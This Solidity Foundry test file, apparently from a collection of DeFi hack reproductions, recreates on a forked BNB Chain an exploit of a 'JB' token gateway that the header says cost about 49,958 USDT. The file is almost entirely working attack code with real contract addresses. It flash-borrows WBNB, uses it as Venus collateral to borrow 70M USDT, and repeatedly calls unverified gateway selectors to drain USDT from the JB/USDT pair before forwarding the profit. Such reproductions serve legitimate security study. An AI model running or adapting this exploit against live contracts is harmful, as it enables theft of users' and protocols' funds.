// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 49958.06 USDT
// Attacker : 0xd99e1abfc5dd5034d7ff63828d16c5e945d1b856
// Attack Contract : 0xcc21c75f9e13054667663f9ed37f41e65b52dee7
// Vulnerable Contract : 0x1b5732eb98911c25acf7bdfaffb9409782cae6d7
// Attack Tx : https://bscscan.com/tx/0x54e120b8d62a9d7cef94bf51f1f5b8aa13565d76d8797a79afeeb25ed0e1dc25

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x1b5732eb98911c25acf7bdfaffb9409782cae6d7#code

// @Analysis
// Twitter Guy : https://x.com/audit_911/status/2067943961327763788
//
// The attacker flash-borrowed WBNB, used it as Venus collateral, borrowed 70M USDT, and fed the USDT into
// the unverified JB helper. Repeated JB helper cycles used the live JB balance to sell/burn/sync through the
// JB/USDT pair, releasing USDT from the pair. Venus was repaid and the remaining USDT was forwarded as profit.

address constant ATTACKER = 0xD99E1aBfC5dd5034D7FF63828D16c5E945D1b856;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant JB = 0xcF92E7eF4A63D52dc15F45A24f4F815f00f299a7;
address constant FLASH_LENDER = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant VENUS_COMPTROLLER = 0xfD36E2c2a6789Db23113685031d7F16329158384;
address constant V_WBNB = 0x6bCa74586218dB34cdB402295796b79663d816e9;
address constant V_USDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255;
address constant JB_GATEWAY = 0x1B5732Eb98911c25acf7bDfAffB9409782CAE6d7;
address constant JB_USDT_PAIR = 0x43932cbb49c363F68655b5Ad2950ED4630CB49F8;
address constant JB_AUTH_HELPER = 0x94741df7BF9dB91B172A4E195E9BeA79Ce3726cD;

interface IFlashLender {
    function flashLoan(
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface IVenusComptroller {
    function enterMarkets(
        address[] calldata vTokens
    ) external returns (uint256[] memory);
}

interface IVToken {
    function mint(
        uint256 mintAmount
    ) external returns (uint256);
    function borrow(
        uint256 borrowAmount
    ) external returns (uint256);
    function repayBorrow(
        uint256 repayAmount
    ) external returns (uint256);
    function redeemUnderlying(
        uint256 redeemAmount
    ) external returns (uint256);
}

interface IJBAuthHelper {
    function owner() external view returns (address);

    function parent(
        address account
    ) external view returns (address);

    function transferOwnership(
        address newOwner
    ) external;

    function bindReferrer(
        address referrer
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 104_980_466;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(JB, "JB");
        vm.label(FLASH_LENDER, "Flash Lender");
        vm.label(VENUS_COMPTROLLER, "Venus Comptroller");
        vm.label(V_WBNB, "vWBNB");
        vm.label(V_USDT, "vUSDT");
        vm.label(JB_GATEWAY, "JB Gateway");
        vm.label(JB_USDT_PAIR, "JB/USDT Pair");
        vm.label(JB_AUTH_HELPER, "JB Auth Helper");
    }

    function testExploit() public balanceLog {
        uint256 attackerBalanceBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        JBExploit exploit = new JBExploit();

        address helperOwner = IJBAuthHelper(JB_AUTH_HELPER).owner();

        // Harness setup: make the fresh PoC contract the JB_AUTH_HELPER owner/admin.
        vm.prank(helperOwner);
        IJBAuthHelper(JB_AUTH_HELPER).transferOwnership(address(exploit));
        assertEq(IJBAuthHelper(JB_AUTH_HELPER).owner(), address(exploit), "helper owner");

        // The gateway still checks parent(address(exploit)); the helper rejects self-referrers,
        // so bind the fresh owner/admin to the previous non-self referrer root.
        vm.prank(address(exploit));
        IJBAuthHelper(JB_AUTH_HELPER).bindReferrer(helperOwner);
        assertEq(IJBAuthHelper(JB_AUTH_HELPER).parent(address(exploit)), helperOwner, "helper parent");

        vm.prank(ATTACKER);
        exploit.run();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBalanceBefore;
        assertGt(profit, 40_000 ether, "USDT profit");
    }
}

contract JBExploit {
    bytes4 private constant FLASH_CALLBACK_SELECTOR = 0x13a1a562;
    bytes4 private constant JB_BOOTSTRAP_SELECTOR = 0xd680aabd;
    bytes4 private constant JB_CYCLE_SELECTOR = 0x53a9fcbc;

    fallback() external payable {
        require(msg.sig == FLASH_CALLBACK_SELECTOR, "unexpected callback");

        (uint256 amount, bytes memory data) = abi.decode(msg.data[4:], (uint256, bytes));
        (address jb, address pair, address gateway) = abi.decode(data, (address, address, address));
        require(jb == JB && pair == JB_USDT_PAIR && gateway == JB_GATEWAY, "bad callback data");

        executeFlashLoan(amount);
    }

    function run() external {
        uint256 flashLoanAmount = IERC20(WBNB_TOKEN).balanceOf(FLASH_LENDER);

        IERC20(WBNB_TOKEN).approve(FLASH_LENDER, type(uint256).max);
        // step 1: flash-borrow WBNB from the lender.
        IFlashLender(FLASH_LENDER).flashLoan(WBNB_TOKEN, flashLoanAmount, abi.encode(JB, JB_USDT_PAIR, JB_GATEWAY));

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(address(this));
        IERC20(USDT_TOKEN).transfer(msg.sender, profit);
    }

    function executeFlashLoan(
        uint256 flashLoanAmount
    ) private {
        // step 2: use the flash-borrowed WBNB as Venus collateral.
        IERC20(WBNB_TOKEN).approve(V_WBNB, flashLoanAmount);

        address[] memory markets = new address[](1);
        markets[0] = V_WBNB;
        IVenusComptroller(VENUS_COMPTROLLER).enterMarkets(markets);

        require(IVToken(V_WBNB).mint(flashLoanAmount) == 0, "vWBNB mint failed");

        // step 3: borrow the clean USDT amount used by the attacker.
        uint256 borrowAmount = 70_000_000 ether;
        require(IVToken(V_USDT).borrow(borrowAmount) == 0, "vUSDT borrow failed");

        IERC20(USDT_TOKEN).approve(JB_GATEWAY, type(uint256).max);
        IERC20(JB).approve(JB_GATEWAY, type(uint256).max);

        // step 4: seed the JB cycle through the unverified helper selector 0xd680aabd.
        callJBGateway(JB_BOOTSTRAP_SELECTOR, borrowAmount);

        // step 5: repeat the partial-balance cycle, then pass the remaining JB balance.
        for (uint256 i = 0; i < 15; i++) {
            uint256 cycleAmount = IERC20(JB).balanceOf(address(this)) / 50;
            callJBGateway(JB_CYCLE_SELECTOR, cycleAmount);
        }
        callJBGateway(JB_CYCLE_SELECTOR, IERC20(JB).balanceOf(address(this)));

        // step 6: repay Venus, redeem WBNB, and leave WBNB approval for the flash lender pull.
        IERC20(USDT_TOKEN).approve(V_USDT, borrowAmount);
        require(IVToken(V_USDT).repayBorrow(borrowAmount) == 0, "vUSDT repay failed");
        require(IVToken(V_WBNB).redeemUnderlying(flashLoanAmount) == 0, "vWBNB redeem failed");
        IERC20(WBNB_TOKEN).approve(FLASH_LENDER, flashLoanAmount);
    }

    function callJBGateway(
        bytes4 selector,
        uint256 amount
    ) private returns (uint256 result) {
        (bool success, bytes memory returnData) =
            JB_GATEWAY.call(abi.encodeWithSelector(selector, amount, uint256(0), 1 ether));
        require(success, "JB gateway call failed");
        result = abi.decode(returnData, (uint256));
    }
}
